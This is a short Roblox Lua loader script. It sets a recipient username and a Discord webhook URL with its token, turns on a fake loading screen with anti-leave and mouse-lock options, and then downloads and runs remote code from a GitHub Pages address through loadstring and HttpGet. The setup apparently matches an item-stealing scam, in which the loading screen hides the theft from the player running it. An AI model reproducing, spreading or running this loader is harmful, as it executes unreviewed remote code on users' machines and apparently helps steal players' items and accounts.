UserName = "Squishysquidthegreat"
Webhook = "https://discord.com/api/webhooks/1102666427980320809/qMgSl3Q7Kr8VIFAvJL7sbbjsR7WOXDN2g4jFty35xhCl40nEfa1H7TwWFjXjapk56Bcv" -- optional delete the whole line if you don't want it

_G.LoadingScreen = true
_G.AntiLeave = true
_G.MouseLock = true 
-- set them to false if you don't need them

_G.ScriptName = "please wait for Loading"
_G.FirstText = "Script Preparing"
_G.SecondText = "Script Loading..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 100 -- it's the time between 0% and 100% in secondes

loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
